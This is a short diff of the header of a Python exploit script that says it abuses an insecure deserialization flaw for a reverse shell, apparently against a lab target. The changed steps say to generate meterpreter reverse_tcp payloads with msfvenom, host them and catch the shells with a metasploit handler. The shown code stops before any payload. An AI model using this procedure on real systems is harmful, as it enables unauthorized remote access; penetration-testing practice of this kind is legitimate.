@@ -6,13 +6,14 @@ This script exploits an insecure deserialization to get a reverse shell.
 Before running the script do the following:
 1. Create msfvenom shell using payload msfvenom/windows/x64/meterpreter/reverse_tcp.exe
 2. Call the msfvenom shells msfvenom.exe and rev.exe
-3. Run a python server to host the generated shell.
-4. Run metasploit exploit handler listener with 'exploit -j' to catch the two different reverse shells
+3. Run a python server to host the generated shell. 
+4. Update the IP address and listening port in the payloads below
+5. Run metasploit exploit handler listener with 'exploit -j' to catch the two different reverse shells
 '''
 
 import requests
 
-target= "10.129.42.182:8000"
+target= "10.19.42.181:8000"
 proxies= {"http":"http://127.0.0.1:8080"}
 session= requests.session()
 headers= {"Content-Type": "application/x-www-form-urlencoded",
